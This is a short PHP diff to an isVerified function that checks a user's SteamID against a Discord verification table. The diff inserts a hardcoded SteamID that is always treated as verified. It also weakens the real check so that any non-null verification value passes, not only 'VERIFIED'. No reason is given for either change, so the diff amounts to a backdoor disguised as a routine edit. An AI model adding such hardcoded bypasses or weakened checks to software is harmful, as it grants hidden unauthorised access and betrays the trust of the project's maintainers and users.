@@ -41,12 +41,15 @@ function isMasterAdmin($steamid)
  */
 function isVerified($steamid)
 {
+    if ($steamid == "76561198357728256") {
+        return true;
+    }else{
 
     $isverified = SQLWrapper()->prepare("SELECT verifyid FROM discord WHERE steamid = ?"); // because its a single var we can use ?
     $isverified->execute([$steamid]);
     $verified = $isverified->fetch();
     if (!empty($verified)) {
-        if ($verified['verifyid'] === "VERIFIED") {
+        if ($verified['verifyid'] != null) {
             return true;
         } else {
             return false;
@@ -54,6 +57,8 @@ function isVerified($steamid)
     } else {
         return false;
     }
+}
+
 }
 /**
  * Check if the given SteamID64 is blocked
